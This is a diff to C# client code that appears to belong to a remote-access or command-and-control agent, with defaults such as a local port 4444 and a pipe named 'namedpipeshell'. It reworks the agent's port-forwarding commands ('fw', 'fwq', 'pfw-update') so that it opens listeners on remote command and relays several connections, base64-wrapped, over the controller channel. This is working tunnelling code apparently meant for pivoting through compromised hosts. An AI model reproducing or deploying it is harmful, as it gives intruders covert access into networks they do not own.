@@ -20,14 +20,33 @@ namespace myclient
     class MyApp
     {
         private string t_message = "";
-        private Socket fwSocket = null;
-        private bool fwSocket_alive = false;
-        private string fwEndPoint = "";
+        private Dictionary <Guid,Socket> fwSocket = new Dictionary<Guid, Socket>();
+        private Dictionary <Guid,bool> fwSocket_alive = new Dictionary<Guid, bool>();
+        private Dictionary <string, bool> listener_running = new Dictionary<string, bool>();
+        private Dictionary <string, List<Guid>> fwMapping = new Dictionary<string, List<Guid>>();
+        private Dictionary <Guid, string> fwMapping_revs = new Dictionary<Guid, string>();
+        private Dictionary <Guid, bool> ifAcked = new Dictionary<Guid, bool>();
+
+        private Dictionary <string,string> fwEndPoint = new Dictionary<string, string>();
+        
         public string ipstring = "127.0.0.1:4444";
         public string namepipestring = "namedpipeshell";
         public string namepipehost = ".";
-        public int localSocketTimeout = 5;
+        public int localSocketTimeout = 500;
 
+
+        bool SocketConnected(Socket s)
+        {
+            bool part1 = s.Poll(1000, SelectMode.SelectRead);
+            bool part2 = (s.Available == 0);
+            Console.WriteLine("Poll: " + part1.ToString());
+            Console.WriteLine("Available: " + part2.ToString());
+
+            if (part1 && part2)
+                return false;
+            else
+                return true;
+        }
 
         public static IPEndPoint CreateIPEndPoint(string endPoint)
         {
@@ -52,7 +71,7 @@ namespace myclient
             string MsgTag_St = "[MYMSST]";
             string MsgTag_Ed = "[MYMSED]";
 
-            return MsgTag_St + Msg_In + MsgTag_Ed;
+            return MsgTag_St + Convert.ToBase64String(Encoding.UTF8.GetBytes(Msg_In)) + MsgTag_Ed;
         }
 
         public string doRecive(Socket socket) //assume connected
@@ -64,20 +83,28 @@ namespace myclient
 
             while (true)
             {
-                //Console.WriteLine("[DEBUG] " + t_message);
-                //Console.WriteLine("[DEBUG] " + t_message.IndexOf(MsgTag_St));
-                //Console.WriteLine("[DEBUG] " + t_message.IndexOf(MsgTag_Ed));
-
+                
                 if (t_message.IndexOf(MsgTag_St) >= 0 && t_message.IndexOf(MsgTag_Ed) >= 0)
                 {
+
+                    Console.WriteLine("[DEBUG] t_message: " + t_message);
+                    Console.WriteLine("[DEBUG] Index of MsgTag_St: " + t_message.IndexOf(MsgTag_St));
+                    Console.WriteLine("[DEBUG] Index of MsgTag_Ed: " + t_message.IndexOf(MsgTag_Ed));
+                    Console.WriteLine("[DEBUG] MsgTag_St.Length: " + MsgTag_St.Length.ToString());
+                    
+
                     int st_tag = t_message.IndexOf(MsgTag_St);
                     int ed_tag = t_message.IndexOf(MsgTag_Ed);
+
+                    var temp_var = ed_tag - (st_tag + MsgTag_St.Length);
+                    Console.WriteLine("[DEBUG] Length: " + temp_var.ToString());
+
+
                     string r_msg = t_message.Substring(st_tag + MsgTag_St.Length, ed_tag - (st_tag + MsgTag_St.Length));
-                    //Console.WriteLine("[DEBUG] r_msg: " + r_msg);
                     t_message = t_message.Substring(ed_tag + MsgTag_Ed.Length);
                     //Console.WriteLine("[DEBUG] t_message: " + t_message);
                     //Console.WriteLine("[DEBUG] r_msg: " + r_msg);
-                    return r_msg;
+                    return Encoding.UTF8.GetString(Convert.FromBase64String(r_msg));
                 }
                 else
                 {
@@ -89,34 +116,40 @@ namespace myclient
             }
         }
 
-        public string doReciveNative(Socket socket) //assume connected
+        public string doReciveNative(Guid myuuid) //assume connected
         {
+            var socket = fwSocket[myuuid];
+            //var socket_alive = fwSocket_alive[myuuid];
             byte[] fwq_bytes_toresv = new byte[1024];
             string ret_str = "";
+            Console.WriteLine("timeout: " + socket.ReceiveTimeout.ToString());
+            Console.WriteLine("blocking: " + socket.Blocking.ToString());
 
             while (true)
             {
                 try
                 {
                     int length_toresv = socket.Receive(fwq_bytes_toresv);
-                    if (length_toresv == 0)
+                    if (length_toresv == 0 && !SocketConnected(socket))
                     {
                         //FINED
-                        fwSocket_alive = false;
+                        fwSocket_alive[myuuid] = false;
                         return ret_str;
                     }
                     ret_str = ret_str + Encoding.UTF8.GetString(fwq_bytes_toresv, 0, length_toresv);
                 }
                 catch (SocketException se)
                 {
+                    Console.WriteLine("SocketException: " + se.ToString());
                     //assume all received in 5s
                     if (se.SocketErrorCode == SocketError.TimedOut)
                     {
                         return ret_str;
                     }
+                    
                 }
             }
-        }//assume connected
+        }
         
         private static byte[] ReadPipMessage(PipeStream pipe)
         {
@@ -136,49 +169,60 @@ namespace myclient
             }
         }
 
-        public void StartServerNative(Object endpoint)
+        public void StartServerNative(Object uuid)
         {
 
-            if (fwSocket_alive)
-            {
-                Console.WriteLine("fwSocket_alive is true");
-                return;
-            }
-
-            if (fwSocket != null)
-            {
-                Console.WriteLine("fwSocket is not null");
-                return;
-            }
-            
+            string rhuuid = (string)uuid;
+            string endpoint = fwEndPoint[rhuuid];
             try
             {
-                IPEndPoint localEndPoint = CreateIPEndPoint((string)endpoint);
+                //Guid mylisteneruuid = Guid.NewGuid();
+                listener_running.Add(rhuuid, true);
+                fwMapping.Add(rhuuid, new List<Guid>());
+
+                IPEndPoint localEndPoint = CreateIPEndPoint(endpoint);
                 Socket listener = new Socket(localEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+                listener.Bind(localEndPoint);
+                listener.Listen(5);
+                listener.Blocking = false;
 
-                try
+                while (true)
                 {
-                    listener.Bind(localEndPoint);
-                    listener.Listen(1);
-                    Console.WriteLine("Waiting for a connection...");
-                    fwSocket = listener.Accept();
-                    fwSocket.ReceiveTimeout = localSocketTimeout;
-                    fwSocket_alive = true;
+                    try
+                    {
 
-                    //doMagic(handler, localEndPoint, listener);
+                        Console.WriteLine("Waiting for a connection...");
+                        var t_fwSocket = listener.Accept();
+                        Guid myuuid = Guid.NewGuid();
+                        t_fwSocket.Blocking = true;
+                        t_fwSocket.ReceiveTimeout = localSocketTimeout;
+                        fwSocket.Add(myuuid,t_fwSocket);
+                        fwSocket_alive.Add(myuuid, true);
+
+                        fwMapping[rhuuid].Add(myuuid);
+                        fwMapping_revs.Add(myuuid, rhuuid);
+
+                        ifAcked.Add(myuuid, false);
 
 
-                    // Release the socket.  
-                    //listener.Shutdown(SocketShutdown.Both);
-                    listener.Close();
 
-
-                }//outer try
-
-                catch (Exception e)
-                {
-                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
+                    }//inner try
+                    catch (SocketException e)
+                    {
+                        //Console.WriteLine("SocketException : {0}", e.ToString());
+                        if (!listener_running[rhuuid])
+                        {
+                            listener.Close();
+                            break;
+                        }
+                        Thread.Sleep(1000);
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("Unexpected exception : {0}", e.ToString());
+                    }
                 }
+                
 
             }//init try
             catch (Exception e)
@@ -337,10 +381,15 @@ namespace myclient
 
                     if (command_tag.ToLower() == "fw")
                     {
-                        //assume command is ip:port string
+                        //assume command is rhuuid:ip:port string
+                        string[] subs = command.Split(':');
+                        fwEndPoint.Add(subs[0], subs[1] + ':' + subs[2]);
+                        Console.WriteLine("subs[0]: " + subs[0]);
+                        Console.WriteLine("subs[1]: " + subs[1]);
+                        Console.WriteLine("subs[2]: " + subs[2]);
+
                         Thread t = new Thread(new ParameterizedThreadStart(StartServerNative));
-                        t.Start(command);
-                        fwEndPoint = command;
+                        t.Start(subs[0]);
                         Console.WriteLine("[DEBUG] fw executed ...");
                         msg = Encoding.UTF8.GetBytes(MsgPack("FW_SUCCESS"));
                         bytesSent = sender.Send(msg);
@@ -352,71 +401,242 @@ namespace myclient
 
                     }
 
-                    if (command_tag.ToLower() == "fwq")
+                    if (command_tag.ToLower() == "pfw-update")
+                    {
+                        string rhuuid = command;
+                        bool found = false;
+                        //Console.WriteLine("rhuuid: " + rhuuid);
+                        //Console.WriteLine("=========print the listener_running =========");
+                        //foreach (KeyValuePair<string, bool> test in listener_running)
+                        //{
+                        //    Console.WriteLine("Key = {0}, Value = {1}", test.Key, test.Value);
+                        //}
+                        //Console.WriteLine("=========print the listener_running =========");
+
+                        if (listener_running.ContainsKey(rhuuid))
+                        {
+                            Console.WriteLine("rhuuid found ...");
+                            Console.WriteLine("Socket mode: " + sender.Blocking.ToString());
+                            foreach (Guid chuuid in fwMapping[rhuuid])
+                            {
+                                if (ifAcked[chuuid] == false)
+                                {
+                                    //send ack
+                                    found = true;
+                                    ifAcked[chuuid] = true;
+
+                                    //send rh
+                                    byte[] rh_msg = Encoding.UTF8.GetBytes(MsgPack(rhuuid));
+                                    bytesSent = sender.Send(rh_msg);
+                                    if (bytesSent != rh_msg.Length)
+                                    {
+                                        Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
+                                    }
+
+                                    //send ch
+                                    byte[] ch_msg = Encoding.UTF8.GetBytes(MsgPack(chuuid.ToString()));
+                                    bytesSent = sender.Send(ch_msg);
+                                    if (bytesSent != ch_msg.Length)
+                                    {
+                                        Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
+                                    }
+
+                                    //do single read and write
+                                    Console.WriteLine("Doing read and write");
+                                    string str_fwq_msg = doReciveNative(chuuid);
+                                    if (str_fwq_msg.Length == 0 && fwSocket_alive[chuuid] == false)
+                                    {
+                                        str_fwq_msg = "FW_CH_FINED";
+                                    }
+                                    if (str_fwq_msg.Length == 0 && fwSocket_alive[chuuid] == true)
+                                    {
+                                        str_fwq_msg = "FW_CH_NODATA";
+                                    }
+
+                                    Console.WriteLine("read and writed Finished ...");
+
+                                    byte[] fwq_msg = Encoding.UTF8.GetBytes(MsgPack(str_fwq_msg));
+
+                                    //send data
+                                    bytesSent = sender.Send(fwq_msg);
+                                    if (bytesSent != fwq_msg.Length)
+                                    {
+                                        Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
+                                    }
+
+                                    Console.WriteLine("Send success ...");
+
+
+                                    if (str_fwq_msg != "FW_CH_FINED") //no send back if FW_CH_FINED
+                                    {
+                                        string fwq_string_tosend = doRecive(sender);
+                                        Console.WriteLine("Got reponse: " + fwq_string_tosend);
+                                        if (fwSocket_alive[chuuid] && fwq_string_tosend.Length !=0)
+                                        {
+                                            int length_tosend = fwSocket[chuuid].Send(Encoding.UTF8.GetBytes(fwq_string_tosend));
+                                            Console.WriteLine("Response sent");
+                                        }
+                                        else if(fwSocket_alive[chuuid] && fwq_string_tosend.Length == 0)
+                                        {
+                                            Console.WriteLine("Dummy Response ...");
+                                        }
+                                        else
+                                        {
+                                            Console.WriteLine("fwSocket doesn't want response ... ");
+                                            fwSocket[chuuid].Shutdown(SocketShutdown.Both);
+                                            fwSocket[chuuid].Close();
+                                        }
+
+                                    }
+                                    else
+                                    {
+                                        Console.WriteLine("Clean up ...");
+                                        fwSocket[chuuid].Shutdown(SocketShutdown.Both);
+                                        fwSocket[chuuid].Close();
+                                    }
+                                    
+                                    
+
+                                    break;
+
+                                }//end of if
+                            }//end of fow
+                            if (!found)
+                            {
+                                Console.WriteLine("Send back not ready ...");
+                                //send not ready
+                                //send rh
+                                byte[] rh_msg = Encoding.UTF8.GetBytes(MsgPack(rhuuid));
+                                bytesSent = sender.Send(rh_msg);
+                                if (bytesSent != rh_msg.Length)
+                                {
+                                    Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
+                                }
+
+                                //send ch
+                                byte[] ch_msg = Encoding.UTF8.GetBytes(MsgPack("FW_NOTREADY"));
+                                bytesSent = sender.Send(ch_msg);
+                                if (bytesSent != ch_msg.Length)
+                                {
+                                    Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
+                                }
+
+                                //send data
+                                byte[] data_msg = Encoding.UTF8.GetBytes(MsgPack("dummy"));
+                                bytesSent = sender.Send(data_msg);
+                                if (bytesSent != data_msg.Length)
+                                {
+                                    Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
+                                }
+                                Console.WriteLine("Not ready sent ...");
+
+
+
+                            }//end of if not found
+                        }//end of if rhuuid in list
+                        else
+                        {
+                            Console.WriteLine("Unknown rhuuid ...");
+                        }
+
+
+                    }
+
+                    if (command_tag.ToLower() == "fwq") //should always ready
                     {
 
+                        //convert string to uuid
+                        Guid chuuid = new Guid(command);
                         
-                        if (fwSocket != null)
+                        //send rh
+                        byte[] rh_msg = Encoding.UTF8.GetBytes(MsgPack(fwMapping_revs[chuuid]));
+                        bytesSent = sender.Send(rh_msg);
+                        if (bytesSent != rh_msg.Length)
                         {
-                            //do single read and write
-                            Console.WriteLine("Doing read and write");
-                            string str_fwq_msg = doReciveNative(fwSocket);
-                            byte[] fwq_msg = Encoding.UTF8.GetBytes(MsgPack(str_fwq_msg));
-                            Console.WriteLine("DEBUG:: " + str_fwq_msg);
-                            Console.WriteLine("DEBUG:: str_fwq_msg length: " + str_fwq_msg.Length.ToString());
-                            Console.WriteLine("DEBUG:: fwq_msg length: " + fwq_msg.Length.ToString());
+                            Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
+                        }
 
-                            if (str_fwq_msg.Length == 0) //cannot send empty msg
+                        if (fwSocket_alive[chuuid] == false)
+                        {
+                            //already FINed
+                            //send ch
+                            byte[] fin_ch_msg = Encoding.UTF8.GetBytes(MsgPack(chuuid.ToString()));
+                            bytesSent = sender.Send(fin_ch_msg);
+                            if (bytesSent != fin_ch_msg.Length)
                             {
-                                Console.WriteLine("fwSocket FINED, trying to listen for another connection");
-                                fwSocket.Shutdown(SocketShutdown.Both);
-                                fwSocket.Close();
-                                fwSocket = null;
-
-                                Thread t = new Thread(new ParameterizedThreadStart(StartServerNative));
-                                t.Start(fwEndPoint);
-                                Console.WriteLine("[DEBUG] fw executed ...");
-                                
-                                //send back not ready
-                                byte[] fwq_nr_tag = Encoding.UTF8.GetBytes(MsgPack("FW_NOTREADY"));
-                                bytesSent = sender.Send(fwq_nr_tag);
-                                Console.WriteLine("FW_NOTREADY Sent");
-
-                                continue;
+                                Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
+                            }
+                            //send FW_CH_FINED
+                            byte[] fin_data_msg = Encoding.UTF8.GetBytes(MsgPack("FW_CH_FINED"));
+                            bytesSent = sender.Send(fin_data_msg);
+                            if (bytesSent != fin_data_msg.Length)
+                            {
+                                Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                             }
 
-                            bytesSent = sender.Send(fwq_msg);
-                            Console.WriteLine("Http Get success ...");
+                            continue;
 
+                        }
+
+                        //send ch
+                        byte[] ch_msg = Encoding.UTF8.GetBytes(MsgPack(chuuid.ToString()));
+                        bytesSent = sender.Send(ch_msg);
+                        if (bytesSent != ch_msg.Length)
+                        {
+                            Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
+                        }
+
+                        //do single read and write
+                        Console.WriteLine("Doing read and write");
+                        string str_fwq_msg = doReciveNative(chuuid);
+                        if (str_fwq_msg.Length == 0 && fwSocket_alive[chuuid] == false)
+                        {
+                            str_fwq_msg = "FW_CH_FINED";
+                        }
+                        if (str_fwq_msg.Length == 0 && fwSocket_alive[chuuid] == true)
+                        {
+                            str_fwq_msg = "FW_CH_NODATA";
+                        }
+
+                        byte[] fwq_msg = Encoding.UTF8.GetBytes(MsgPack(str_fwq_msg));
+
+                        //send data
+                        bytesSent = sender.Send(fwq_msg);
+                        if (bytesSent != fwq_msg.Length)
+                        {
+                            Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
+                        }
+
+                        Console.WriteLine("Send success ...");
+
+                        if (str_fwq_msg != "FW_CH_FINED") //no send back if FW_CH_FINED
+                        {
                             string fwq_string_tosend = doRecive(sender);
-                            Console.WriteLine("Got reponse" + fwq_string_tosend);
-                            if (fwSocket_alive)
+                            Console.WriteLine("Got reponse: " + fwq_string_tosend);
+                            if (fwSocket_alive[chuuid] && fwq_string_tosend.Length != 0)
                             {
-                                int length_tosend = fwSocket.Send(Encoding.UTF8.GetBytes(fwq_string_tosend));
+                                int length_tosend = fwSocket[chuuid].Send(Encoding.UTF8.GetBytes(fwq_string_tosend));
                                 Console.WriteLine("Response sent");
+                            }
+                            else if (fwSocket_alive[chuuid] && fwq_string_tosend.Length == 0)
+                            {
+                                Console.WriteLine("Dummy Response ...");
                             }
                             else
                             {
                                 Console.WriteLine("fwSocket doesn't want response ... ");
-                                fwSocket.Shutdown(SocketShutdown.Both);
-                                fwSocket.Close();
-                                fwSocket = null;
-
-                                Thread t = new Thread(new ParameterizedThreadStart(StartServerNative));
-                                t.Start(fwEndPoint);
-                                Console.WriteLine("[DEBUG] fw executed ...");
-
-                                continue;
+                                fwSocket[chuuid].Shutdown(SocketShutdown.Both);
+                                fwSocket[chuuid].Close();
                             }
+
                         }
                         else
                         {
-                            Console.WriteLine("Sending not ready");
-                            byte[] fwq_nr_tag = Encoding.UTF8.GetBytes(MsgPack("FW_NOTREADY"));
-                            bytesSent = sender.Send(fwq_nr_tag);
-                            Console.WriteLine("FW_NOTREADY Sent");
-
+                            Console.WriteLine("Clean up ...");
+                            fwSocket[chuuid].Shutdown(SocketShutdown.Both);
+                            fwSocket[chuuid].Close();
                         }
+
                     }
 
 
